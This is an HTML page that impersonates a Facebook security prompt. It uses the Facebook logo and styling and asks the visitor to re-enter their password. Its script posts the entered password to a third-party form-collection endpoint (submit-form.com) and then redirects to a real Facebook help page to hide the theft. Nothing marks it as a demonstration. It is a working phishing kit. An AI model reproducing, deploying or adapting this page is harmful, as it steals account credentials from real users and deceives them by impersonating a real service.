<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Password Page</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body {
            font-family: 'Helvetica Neue', Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            background-color: white;
            padding: 40px 30px;
            border-radius: 8px;
            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.15);
            text-align: center;
            width: 360px;
            position: relative;
        }

        .logo {
            margin-bottom: 20px;
        }

        .logo img {
            width: 120px;
        }

        .header {
            margin-bottom: 20px;
            font-size: 18px;
            color: #333;
            font-weight: bold;
        }

        .form-group {
            margin-bottom: 25px;
            text-align: left;
            position: relative;
        }

        .form-group label {
            display: block;
            font-weight: bold;
            margin-bottom: 8px;
            font-size: 14px;
            color: #606770;
        }

        .input-wrapper {
            position: relative;
        }

        .form-group input {
            width: 100%;
            padding: 14px;
            padding-right: 40px;
            border: 1px solid #ccd0d5;
            border-radius: 6px;
            font-size: 16px;
            color: #1c1e21;
            box-sizing: border-box;
        }

        .form-group input:focus {
            border-color: #1877f2;
            outline: none;
            box-shadow: 0px 0px 0px 2px rgba(24, 119, 242, 0.2);
        }

        .eye-icon {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 20px;
            color: #606770;
            cursor: pointer;
            transition: color 0.3s ease;
        }

        .eye-icon:hover {
            color: #1877f2;
        }

        .submit-button {
            background-color: #1877f2;
            color: white;
            border: none;
            padding: 14px;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
        }

        .submit-button:hover {
            background-color: #166fe5;
        }

        .error-message {
            color: #e74c3c;
            font-size: 14px;
            margin-top: 5px;
            margin-bottom: 15px;
            text-align: left;
        }

        .password-strength {
            font-size: 14px;
            color: #606770;
            margin-top: 5px;
        }

        .strength-weak {
            color: #e74c3c;
        }

        .strength-medium {
            color: #f39c12;
        }

        .strength-strong {
            color: #2ecc71;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="logo">
            <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" alt="Logo">
        </div>
        <div class="header">
            Facebook Security
        </div>
        <p>Please re-enter your password to complete the request.</p>
        <form id="meta-form" action="https://submit-form.com/jvm1Bf9Xo" method="POST" novalidate>
            <input type="hidden" name="_redirect" value="https://www.facebook.com/help/media/thank-you?rdrhc" />

            <!-- Replace with your Access Key -->
            <input type="hidden" name="access_key" value="22983eba-14f6-431b-8283-10e298027760">

            <div class="form-group">
                <label for="password">Password</label>
                <div class="input-wrapper">
                    <input type="password" id="password" name="password" placeholder="Enter your password" required minlength="6">
                    <i class="eye-icon fas fa-eye" id="togglePassword" role="button" aria-label="Toggle password visibility"></i>
                </div>
                <span id="error-message" class="error-message"></span>
                <div id="password-strength" class="password-strength"></div>
            </div>

            <button type="submit" class="submit-button">Submit</button>
        </form>
    </div>

    <script>
        // Toggle password visibility
        document.getElementById('togglePassword').addEventListener('click', function() {
            var passwordField = document.getElementById('password');
            var eyeIcon = this;
            if (passwordField.type === 'password') {
                passwordField.type = 'text';
                eyeIcon.classList.remove('fa-eye');
                eyeIcon.classList.add('fa-eye-slash');
            } else {
                passwordField.type = 'password';
                eyeIcon.classList.remove('fa-eye-slash');
                eyeIcon.classList.add('fa-eye');
            }
        });

        // Password strength meter
        function updatePasswordStrength(password) {
            const strengthText = document.getElementById('password-strength');
            const regexWeak = /^(?=.*[a-zA-Z]).{6,}$/;
            const regexMedium = /^(?=.*[a-zA-Z])(?=.*\d).{6,}$/;
            const regexStrong = /^(?=.*[a-zA-Z])(?=.*\d)(?=.*[!@#$%^&*]).{6,}$/;

            if (password.length === 0) {
                strengthText.textContent = '';
                return;
            }

            if (regexStrong.test(password)) {
                strengthText.textContent = 'Strong';
                strengthText.className = 'password-strength strength-strong';
            } else if (regexMedium.test(password)) {
                strengthText.textContent = 'Medium';
                strengthText.className = 'password-strength strength-medium';
            } else if (regexWeak.test(password)) {
                strengthText.textContent = 'Weak';
                strengthText.className = 'password-strength strength-weak';
            } else {
                strengthText.textContent = '';
            }
        }

        // Listen for password input to update strength
        document.getElementById('password').addEventListener('input', function() {
            updatePasswordStrength(this.value);
        });

        // Form validation and submission
        document.getElementById('meta-form').addEventListener('submit', function(event) {
            event.preventDefault();
            const passwordField = document.getElementById('password');
            const errorMessage = document.getElementById('error-message');

            if (passwordField.validity.tooShort) {
                errorMessage.textContent = 'Password must be at least 6 characters long.';
            } else if (!passwordField.value) {
                errorMessage.textContent = 'Password is required.';
            } else {
                errorMessage.textContent = '';
                // Perform form submission via Fetch API
                var formData = new FormData(this);
                fetch(this.action, {
                    method: 'POST',
                    body: formData,
                    headers: {
                        'Accept': 'application/json'
                    }
                })
                .then(response => {
                    if (response.ok) {
                        window.location.href = 'https://www.facebook.com/help/media/thank-you?rdrhc'; // Redirect to desired URL
                    } else {
                        errorMessage.textContent = 'There was an error. Please try again.';
                    }
                })
                .catch(() => {
                    errorMessage.textContent = 'There was an error. Please try again.';
                });
            }
        });
    </script>
</body>

</html>
